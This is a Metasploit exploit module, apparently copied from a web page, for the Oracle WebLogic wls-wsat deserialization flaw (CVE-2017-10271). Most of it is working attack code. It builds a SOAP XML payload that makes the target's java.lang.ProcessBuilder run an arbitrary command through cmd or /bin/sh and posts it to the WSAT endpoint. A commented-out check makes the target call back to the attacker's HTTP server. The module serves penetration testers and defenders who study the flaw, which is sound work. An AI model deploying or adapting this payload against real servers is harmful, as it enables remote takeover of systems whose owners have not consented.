# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  # include Msf::Exploit::Remote::HttpServer
 
  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;           => &#039;Oracle WebLogic wls-wsat Component Deserialization RCE&#039;,
        &#039;Description&#039;    => %q(
            The Oracle WebLogic WLS WSAT Component is vulnerable to a XML Deserialization
        remote code execution vulnerability. Supported versions that are affected are
        10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. Discovered by Alexey Tyurin
        of ERPScan and Federico Dotta of Media Service. Please note that SRVHOST, SRVPORT,
        HTTP_DELAY, URIPATH and related HTTP Server variables are only used when executing a check
        and will not be used when executing the exploit itself.
        ),
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Author&#039;         => [
          &#039;Kevin Kirsche <d3c3pt10n[AT]deceiveyour.team>&#039;, # Metasploit module
          &#039;Luffin&#039;, # Proof of Concept
          &#039;Alexey Tyurin&#039;, &#039;Federico Dotta&#039; # Vulnerability Discovery
        ],
        &#039;References&#039;     =>
          [
            [&#039;URL&#039;, &#039;https://www.oracle.com/technetwork/topics/security/cpuoct2017-3236626.html&#039;], # Security Bulletin
            [&#039;URL&#039;, &#039;https://github.com/Luffin/CVE-2017-10271&#039;], # Proof-of-Concept
            [&#039;URL&#039;, &#039;https://github.com/kkirsche/CVE-2017-10271&#039;], # Standalone Exploit
            [&#039;CVE&#039;, &#039;2017-10271&#039;],
            [&#039;EDB&#039;, &#039;43458&#039;]
          ],
        &#039;Platform&#039;      => %w{ win unix },
        &#039;Arch&#039;          => [ ARCH_CMD ],
        &#039;Targets&#039;        =>
          [
            [ &#039;Windows Command payload&#039;, { &#039;Arch&#039; => ARCH_CMD, &#039;Platform&#039; => &#039;win&#039; } ],
            [ &#039;Unix Command payload&#039;, { &#039;Arch&#039; => ARCH_CMD, &#039;Platform&#039; => &#039;unix&#039; } ]
          ],
        &#039;DisclosureDate&#039; => "Oct 19 2017",
        # Note that this is by index, rather than name. It&#039;s generally easiest
        # just to put the default at the beginning of the list and skip this
        # entirely.
        &#039;DefaultTarget&#039;  => 0
      )
    )
 
    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to the WebLogic WSAT endpoint&#039;, &#039;/wls-wsat/CoordinatorPortType&#039;]),
      OptPort.new(&#039;RPORT&#039;, [true, "The remote port that the WebLogic WSAT endpoint listens on", 7001]),
      OptFloat.new(&#039;TIMEOUT&#039;, [true, "The timeout value of requests to RHOST", 20.0]),
      # OptInt.new(&#039;HTTP_DELAY&#039;, [true, &#039;Time that the HTTP Server will wait for the check payload&#039;, 10])
    ])
  end
 
  def cmd_base
    if target[&#039;Platform&#039;] == &#039;win&#039;
      return &#039;cmd&#039;
    else
      return &#039;/bin/sh&#039;
    end
  end
 
  def cmd_opt
    if target[&#039;Platform&#039;] == &#039;win&#039;
      return &#039;/c&#039;
    else
      return &#039;-c&#039;
    end
  end
 
 
  #
  # This generates a XML payload that will execute the desired payload on the RHOST
  #
  def exploit_process_builder_payload
    # Generate a payload which will execute on a *nix machine using /bin/sh
    xml = %Q{<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3" >
            <void index="0">
              <string>#{cmd_base}</string>
            </void>
            <void index="1">
              <string>#{cmd_opt}</string>
            </void>
            <void index="2">
              <string>#{payload.encoded.encode(xml: :text)}</string>
            </void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>}
  end
 
  #
  # This builds a XML payload that will generate a HTTP GET request to our SRVHOST
  # from the target machine.
  #
  def check_process_builder_payload
    xml = %Q{<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8" class="java.beans.XMLDecoder">
        <void id="url" class="java.net.URL">
          <string>#{get_uri.encode(xml: :text)}</string>
        </void>
        <void idref="url">
          <void id="stream" method = "openStream" />
        </void>
      </java>
    </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>}
  end
 
  #
  # In the event that a &#039;check&#039; host responds, we should respond randomly so that we don&#039;t clog up
  # the logs too much with a no response error or similar.
  #
  def on_request_uri(cli, request)
    random_content = &#039;<html><head></head><body><p>&#039;+Rex::Text.rand_text_alphanumeric(20)+&#039;<p></body></html>&#039;
    send_response(cli, random_content)
 
    @received_request = true
  end
 
  #
  # The exploit method connects to the remote service and sends a randomly generated string
  # encapsulated within a SOAP XML body. This will start an HTTP server for us to receive
  # the response from. This is based off of the exploit technique from
  # exploits/windows/novell/netiq_pum_eval.rb
  #
  # This doesn&#039;t work as is because MSF cannot mix HttpServer and HttpClient
  # at the time of authoring this
  #
  # def check
  #   start_service
  #
  #   print_status(&#039;Sending the check payload...&#039;)
  #   res = send_request_cgi({
  #     &#039;method&#039;   => &#039;POST&#039;,
  #     &#039;uri&#039;      => normalize_uri(target_uri.path),
  #     &#039;data&#039;     => check_process_builder_payload,
  #     &#039;ctype&#039;    => &#039;text/xml;charset=UTF-8&#039;
  #   }, datastore[&#039;TIMEOUT&#039;])
  #
  #   print_status("Waiting #{datastore[&#039;HTTP_DELAY&#039;]} seconds to see if the target requests our URI...")
  #
  #   waited = 0
  #   until @received_request
  #     sleep 1
  #     waited += 1
  #     if waited > datastore[&#039;HTTP_DELAY&#039;]
  #       stop_service
  #       return Exploit::CheckCode::Safe
  #     end
  #   end
  #
  #   stop_service
  #   return Exploit::CheckCode::Vulnerable
  # end
 
  #
  # The exploit method connects to the remote service and sends the specified payload
  # encapsulated within a SOAP XML body.
  #
  def exploit
    send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path),
      &#039;data&#039;     => exploit_process_builder_payload,
      &#039;ctype&#039;    => &#039;text/xml;charset=UTF-8&#039;
    }, datastore[&#039;TIMEOUT&#039;])
  end
end

